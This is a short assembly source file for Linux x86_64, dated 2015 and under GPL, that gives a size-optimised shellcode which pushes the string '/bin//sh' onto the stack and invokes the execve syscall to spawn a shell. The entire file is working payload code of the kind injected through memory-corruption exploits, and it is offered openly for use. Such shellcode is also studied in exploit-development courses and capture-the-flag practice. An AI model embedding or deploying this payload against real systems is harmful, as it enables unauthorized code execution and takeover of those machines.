    #
    # Execve /bin/sh Shellcode Via Push (Linux x86_64)
    #
    # Dying to be the shortest.
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 27 April 2015
    #
    # GPL
    #


    .global _start
_start:
    # char *const argv[]
    xorl %esi, %esi

    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'
    movq $0x68732f2f6e69622f, %rbx

    # for '\x00'
    pushq %rsi

    pushq %rbx

    pushq %rsp
    # const char *filename
    popq %rdi

    # __NR_execve 59
    pushq $59
    popq %rax

    # char *const envp[]
    xorl %edx, %edx

    syscall
